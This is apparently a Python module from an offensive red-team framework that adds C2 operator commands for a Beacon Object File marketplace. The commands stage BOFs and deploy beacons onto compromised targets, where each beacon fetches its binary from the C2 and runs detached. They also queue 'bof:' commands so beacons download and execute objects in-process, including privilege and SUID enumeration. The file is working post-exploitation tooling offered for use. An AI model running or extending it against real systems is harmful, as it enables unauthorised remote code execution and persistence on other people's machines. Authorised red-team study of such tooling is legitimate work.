"""BOF marketplace CommandSet — Beacon Object File discovery, staging and delivery.

Exposes :mod:`modules.bof_registry` and :mod:`modules.bof_delivery`
through the LazyOwn CLI. Every BOF is declared in ``bofs/*.yaml`` with
its lazyaddon beacon client (``beacon`` or ``blacksandbeacon``); these
commands administer that contract end to end:

    - bof_stage: locate the compiled artifact through the client addon
      and stage it in sessions/temp_uploads/bofs/
    - bof_run: build the ``bof:`` command, queue it on the C2, optionally
      await the result from the beacon history
    - bof_deploy: deliver a staged client beacon onto a target reached by
      an atomic session and wait for its first check-in
    - bof_beacons / bof_results: beacon snapshot and BOF result history
    - bof_search / bof_info / bof_catalog / bof_list / bof_install /
      bof_uninstall: catalog administration
"""

from __future__ import annotations

import os
import shlex
import shutil

import cmd2

from cli.commands._base import LazyOwnCommandSet
from utils import (
    GREEN,
    RED,
    RESET,
    YELLOW,
    command_and_control_category,
    print_error,
    print_msg,
    print_succ,
)

CATEGORY = command_and_control_category
BOFS_STAGING_DIR = "sessions/temp_uploads/bofs"
BEACON_EXTERNAL_DIR = "external/.exploit/beacon"


class BofMarketplaceCommandSet(LazyOwnCommandSet):
    """BOF marketplace: search, install, stage, deploy and run BOFs on beacons."""

    phase = "c2"
    category = CATEGORY

    @staticmethod
    def _ensure_staging_dir() -> str:
        """Create and return the BOF staging directory path."""
        os.makedirs(BOFS_STAGING_DIR, exist_ok=True)
        return BOFS_STAGING_DIR

    def _stage_bof(self, bof_name: str) -> str | None:
        """Stage a compiled BOF via the delivery service.

        Uses the BOF YAML ``client``/``client_artifact`` contract
        (lazyaddon beacon client install path) with a filesystem walk as
        the fallback.

        Args:
            bof_name: Catalog BOF name.

        Returns:
            The staged path, or None when no compiled object exists.
        """
        from modules.bof_registry import BofMarketplace, find_client_artifact

        mp = BofMarketplace(sessions_dir="sessions")
        entry = mp.catalog.get(bof_name)
        artifact = find_client_artifact(entry)
        if artifact is None:
            print_error(
                f"No compiled object found for BOF '{bof_name}' "
                f"(client={entry.client or 'unknown'}). Check external/.exploit/"
            )
            return None
        staging_dir = self._ensure_staging_dir()
        dest_path = os.path.join(staging_dir, bof_name)
        shutil.copy2(artifact, dest_path)
        print_succ(f"BOF staged at {dest_path} (from {artifact})")
        return dest_path

    @cmd2.with_category(command_and_control_category)
    def do_bof_search(self, line: str):
        """Search the BOF catalog by keyword.

        Usage: bof_search [query]
        """
        from modules.bof_registry import BofMarketplace

        mp = BofMarketplace(sessions_dir="sessions")
        results = mp.search(line.strip())
        if not results:
            print_msg(f"{YELLOW}No BOFs found for '{line.strip()}'{RESET}")
            return
        print_msg(f"{GREEN}{len(results)} BOF(s) found:{RESET}")
        for r in results:
            status = f"{GREEN}[INSTALLED]{RESET}" if r["installed"] else f"{RED}[NOT INSTALLED]{RESET}"
            print_msg(f"  {YELLOW}{r['name']}{RESET} [{r['client'] or r['platform']}] {status}")
            print_msg(f"    {r['description'][:100]}")
            if r.get("mitre_technique"):
                print_msg(f"    MITRE: {r['mitre_technique']}")

    @cmd2.with_category(command_and_control_category)
    def do_bof_info(self, line: str):
        """Show detailed information about a BOF.

        Usage: bof_info <name>
        """
        from modules.bof_registry import BofMarketplace

        name = line.strip()
        if not name:
            print_msg("Usage: bof_info <name>")
            return
        mp = BofMarketplace(sessions_dir="sessions")
        info = mp.info(name)
        if "error" in info:
            print_msg(f"{RED}{info['error']}{RESET}")
            return
        cat = info["catalog"]
        status = f"{GREEN}INSTALLED{RESET}" if info["installed"] else f"{RED}NOT INSTALLED{RESET}"
        print_msg(f"{YELLOW}{cat['name']}{RESET} [{status}]")
        print_msg(f"  Description : {cat['description']}")
        print_msg(f"  Author      : {cat['author']}")
        print_msg(f"  URL         : {cat['url']}")
        print_msg(f"  Platform    : {cat['platform']}")
        print_msg(f"  Client      : {cat.get('client', 'N/A')}")
        print_msg(f"  Artifact    : {cat.get('client_artifact', 'N/A')}")
        print_msg(f"  Category    : {cat['category']}")
        print_msg(f"  MITRE       : {cat.get('mitre_technique', 'N/A')}")
        if cat.get("required_args"):
            print_msg(f"  Req. args   : {', '.join(cat['required_args'])}")
        if cat.get("optional_args"):
            print_msg(f"  Opt. args   : {', '.join(cat['optional_args'])}")
        if info["installed"] and info.get("install_info"):
            print_msg(f"  Installed   : {info['install_info'].get('installed_at', '?')}")

    @cmd2.with_category(command_and_control_category)
    def do_bof_install(self, line: str):
        """Install and stage BOFs for beacon delivery.

        Usage: bof_install <name> [<name2> ...]

        Registers the BOF in the sessions manifest and copies the
        compiled artifact to sessions/temp_uploads/bofs/ where the C2's
        ``/download/bofs/<name>`` endpoint serves it.
        """
        from modules.bof_registry import BofMarketplace

        names = line.strip().split()
        if not names:
            print_msg("Usage: bof_install <name> [<name2> ...]")
            return
        mp = BofMarketplace(sessions_dir="sessions")
        for name in names:
            result = mp.install(name)
            if "error" in result:
                print_msg(f"  {RED}x {name}: {result['error']}{RESET}")
                continue
            if result["status"] == "already_installed":
                print_msg(f"  {YELLOW}= {name}: already registered{RESET}")
            else:
                print_msg(f"  {GREEN}+ {name}: registered{RESET}")
            self._stage_bof(name)

    @cmd2.with_category(command_and_control_category)
    def do_bof_stage(self, line: str):
        """Stage a BOF artifact through its lazyaddon beacon client.

        Usage: bof_stage <name>

        Resolves ``bofs/<name>.yaml``'s ``client`` (``beacon`` or
        ``blacksandbeacon``), locates ``client_artifact`` under the
        client addon install path and copies it to the C2 download dir.
        """
        name = line.strip()
        if not name:
            print_msg("Usage: bof_stage <name>")
            return
        staged = self._stage_bof(name)
        if staged is not None:
            from modules.bof_registry import BofMarketplace

            BofMarketplace(sessions_dir="sessions").install(name)

    @cmd2.with_category(command_and_control_category)
    def do_bof_run(self, line: str):
        """Execute a BOF on a connected beacon.

        Usage: bof_run <bof_name> <beacon_client_id> [arg1,arg2,...] [--wait <sec>]

        Stages the BOF, then queues a ``bof:<c2_url>/download/bofs/<name>
        <args>`` command on the C2 for the specified beacon. The beacon
        downloads the object over the malleable channel and executes it
        in-process (COFFLoader on Windows, RunELF loader on BlackSandBeacon).

        Examples:
            bof_run whoami_linux linux_beacon_01 --wait 20
        """
        try:
            tokens = shlex.split(line.strip())
        except ValueError as exc:
            print_error(f"bad argument: {exc}")
            return
        if "--wait" in tokens:
            index = tokens.index("--wait")
            wait = 0.0
            if index + 1 < len(tokens):
                try:
                    wait = float(tokens[index + 1])
                except ValueError:
                    print_error("--wait needs a number of seconds")
                    return
                tokens[index : index + 2] = []
            else:
                print_error("--wait needs a number of seconds")
                return
        else:
            wait = 0.0
        rest = [t for t in tokens if t != ","]
        if len(rest) < 2:
            print_msg("Usage: bof_run <bof_name> <beacon_client_id> [arg1,arg2,...] [--wait <sec>]")
            print_msg("Example: bof_run whoami_linux metasploitable --wait 20")
            return
        bof_name, client_id = rest[0], rest[1]
        bof_args = rest[2:] or None

        from modules.bof_delivery import run_bof

        result = run_bof(bof_name, client_id, args=bof_args, wait=wait)
        if not result["delivered"]:
            print_error(f"C2 rejected or is unreachable: {result['command']}")
            return
        print_succ(f"BOF command queued for beacon '{client_id}': {YELLOW}{result['command']}{RESET}")
        record = result.get("result")
        if record:
            print_msg(f"{GREEN}output ({record.get('timestamp', '?')}):{RESET}")
            print_msg(str(record.get("output", ""))[:2000])
        elif wait:
            print_msg(f"{YELLOW}no output within {wait:.0f}s — check bof_results {client_id}{RESET}")

    @cmd2.with_category(command_and_control_category)
    def do_bof_train(self, line: str):
        """Run a sequence of BOFs over one beacon, awaiting each result.

        Usage: bof_train <beacon_client_id> --bofs <n1,n2,...> [--args <a1,a2>] [--wait <sec>]

        Orchestratable single step: the C2 receives one ``bof:`` command
        per BOF and the command aggregates the outputs from the beacon
        history into one report.

        Examples:
            bof_train metasploitable --bofs whoami_linux,is_sudo,suid_enum --wait 20
        """
        try:
            tokens = shlex.split(line.strip())
        except ValueError as exc:
            print_error(f"bad argument: {exc}")
            return
        wait = 20.0
        names: list[str] = []
        args: list[str] | None = None
        client_id = ""
        index = 0
        while index < len(tokens):
            token = tokens[index]
            if token == "--bofs" and index + 1 < len(tokens):
                names = [n for n in tokens[index + 1].split(",") if n.strip()]
                index += 2
                continue
            if token == "--args" and index + 1 < len(tokens):
                args = [n for n in tokens[index + 1].split(",") if n.strip()]
                index += 2
                continue
            if token == "--wait" and index + 1 < len(tokens):
                try:
                    wait = float(tokens[index + 1])
                except ValueError:
                    print_error("--wait needs a number of seconds")
                    return
                index += 2
                continue
            if not client_id and not token.startswith("--"):
                client_id = token
            index += 1
        if not client_id or not names:
            print_msg("Usage: bof_train <beacon_client_id> --bofs <n1,n2,...> [--args <a1,a2>] [--wait <sec>]")
            return
        from modules.bof_delivery import run_bof_train

        outcome = run_bof_train(client_id, names, args=args, wait=wait)
        print_msg(f"{GREEN}train {len(outcome['results'])} BOF(s) -> beacon '{client_id}'{RESET}")
        for entry in outcome["results"]:
            marker = f"{GREEN}+{RESET}" if entry.get("delivered") else f"{RED}x{RESET}"
            print_msg(f"  {marker} {entry['command']}")
            record = entry.get("result")
            if record:
                text = str(record.get("output", "")).strip()
                if text:
                    print_msg(f"      {text[:400]}")
            else:
                print_msg(f"      {YELLOW}(no output within {wait:.0f}s){RESET}")

    @cmd2.with_category(command_and_control_category)
    def do_bof_deploy(self, line: str):
        """Deliver a staged beacon client onto a target and await check-in.

        Usage: bof_deploy [client] [target] [--wait <sec>]

        The target must have a live atomic session (atomic_exploit
        run/atomic_shell). The beacon fetches its binary from the C2
        ``/download/`` endpoint itself and runs detached; the first
        check-in returns the beacon client id usable by bof_run.
        """
        try:
            tokens = shlex.split(line.strip())
        except ValueError as exc:
            print_error(f"bad argument: {exc}")
            return
        wait = 45.0
        if "--wait" in tokens:
            index = tokens.index("--wait")
            if index + 1 >= len(tokens):
                print_error("--wait needs a number of seconds")
                return
            try:
                wait = float(tokens[index + 1])
            except ValueError:
                print_error("--wait needs a number of seconds")
                return
            tokens[index : index + 2] = []
        client = tokens[0] if tokens else "blacksandbeacon"
        target = tokens[1] if len(tokens) > 1 else (self.params.get("rhost", "") or "")
        if not target:
            print_error("target required (positional or rhost in payload.json)")
            return
        from modules.bof_delivery import c2_reachable, deploy_client

        if not c2_reachable():
            print_error("C2 unreachable — start it first (python3 lazyc2.py) and set lhost/c2_port in payload.json")
            return
        try:
            result = deploy_client(client, target, wait=wait)
        except ValueError as exc:
            print_error(str(exc))
            return
        if result.get("deployed") and result.get("client_id"):
            print_succ(f"beacon checked in: {GREEN}{result['client_id']}{RESET}")
            print_msg(f"next: bof_train {result['client_id']} --bofs whoami_linux,is_sudo")
        else:
            print_error(result.get("reason", "delivery failed"))

    @cmd2.with_category(command_and_control_category)
    def do_bof_beacons(self, line: str):
        """List beacons currently seen by the C2.

        Usage: bof_beacons
        """
        from modules.bof_delivery import recent_beacons

        rows = recent_beacons()
        if not rows:
            print_msg(f"{YELLOW}no beacons known (C2 down? stale history only){RESET}")
            return
        print_msg(f"{GREEN}{len(rows)} beacon(s):{RESET}")
        for row in rows:
            print_msg(
                f"  {row.get('client_id', '?')}  host={row.get('hostname', '?')}"
                f"  user={row.get('user', '?')}  last={row.get('last_seen', '?')}"
            )

    @cmd2.with_category(command_and_control_category)
    def do_bof_results(self, line: str):
        """Show BOF execution history for one beacon.

        Usage: bof_results <beacon_client_id> [limit]
        """
        parts = line.strip().split()
        if not parts:
            print_msg("Usage: bof_results <beacon_client_id> [limit]")
            return
        client_id = parts[0]
        limit = 20
        if len(parts) > 1:
            try:
                limit = max(1, min(100, int(parts[1])))
            except ValueError:
                print_error("limit must be an integer")
                return
        from modules.bof_delivery import bof_results

        try:
            rows = bof_results(client_id, limit=limit)
        except ValueError as exc:
            print_error(str(exc))
            return
        if not rows:
            print_msg(f"{YELLOW}no BOF results for '{client_id}'{RESET}")
            return
        for row in rows:
            print_msg(f"{GREEN}[{row.get('timestamp', '?')}]{RESET} {row.get('command', '')[:100]}")
            print_msg(f"    {str(row.get('output', ''))[:400]}")

    @cmd2.with_category(command_and_control_category)
    def do_bof_uninstall(self, line: str):
        """Uninstall a BOF and remove its staged file.

        Usage: bof_uninstall <name>
        """
        from modules.bof_registry import BofMarketplace

        name = line.strip()
        if not name:
            print_msg("Usage: bof_uninstall <name>")
            return
        mp = BofMarketplace(sessions_dir="sessions")
        result = mp.uninstall(name)
        if "error" in result:
            print_msg(f"{RED}{result['error']}{RESET}")
            return
        staging_path = os.path.join(BOFS_STAGING_DIR, name)
        if os.path.isfile(staging_path):
            os.unlink(staging_path)
        print_msg(f"{GREEN}Uninstalled: {name}{RESET}")

    @cmd2.with_category(command_and_control_category)
    def do_bof_list(self, line: str):
        """List all installed and staged BOFs.

        Usage: bof_list
        """
        from modules.bof_registry import BofMarketplace

        mp = BofMarketplace(sessions_dir="sessions")
        installed = mp.list_installed()
        staged_files = set()
        staging_dir = BOFS_STAGING_DIR
        if os.path.isdir(staging_dir):
            staged_files = {f for f in os.listdir(staging_dir) if os.path.isfile(os.path.join(staging_dir, f))}

        if not installed and not staged_files:
            print_msg(f"{YELLOW}No BOFs installed or staged.{RESET}")
            return

        if installed:
            print_msg(f"{GREEN}{len(installed)} BOF(s) registered:{RESET}")
            for bof in installed:
                staged = bof["name"] in staged_files
                s = f"{GREEN}[STAGED]{RESET}" if staged else f"{YELLOW}[UNSTAGED]{RESET}"
                print_msg(f"  {YELLOW}{bof['name']}{RESET} [{bof.get('platform', '?')}] {s}")
        if staged_files:
            unstaged = staged_files - {b["name"] for b in installed}
            if unstaged:
                print_msg(f"\n{GREEN}Staged files (not registered):{RESET}")
                for f in sorted(unstaged):
                    print_msg(f"  {os.path.join(BOFS_STAGING_DIR, f)}")

    @cmd2.with_category(command_and_control_category)
    def do_bof_catalog(self, line: str):
        """List all BOFs available in the curated catalog.

        Usage: bof_catalog [--category <name>] [--platform windows|linux] [--client <addon>]
        """
        from modules.bof_registry import BofCategory, BofMarketplace, BofPlatform

        mp = BofMarketplace(sessions_dir="sessions")
        entries = mp.catalog.list_all()
        if "--category" in line:
            cat_name = line.split("--category", 1)[1].strip().split()[0]
            try:
                cat = BofCategory(cat_name)
                entries = mp.catalog.list_by_category(cat)
            except ValueError:
                print_msg(f"Unknown category: {cat_name}")
                print_msg(f"Valid: {[c.value for c in BofCategory]}")
                return
        if "--platform" in line:
            plat_name = line.split("--platform", 1)[1].strip().split()[0]
            try:
                plat = BofPlatform(plat_name)
                entries = mp.catalog.list_by_platform(plat)
            except ValueError:
                print_msg(f"Unknown platform: {plat_name}")
                return
        if "--client" in line:
            client_name = line.split("--client", 1)[1].strip().split()[0]
            entries = [entry for entry in entries if entry.client == client_name]
        print_msg(f"{GREEN}{len(entries)} BOF(s) in catalog:{RESET}")
        for entry in entries:
            print_msg(
                f"  {YELLOW}{entry.name}{RESET} [{entry.platform.value}] [{entry.client or '-'}] [{entry.category.value}]"
            )


__all__ = ["BofMarketplaceCommandSet"]
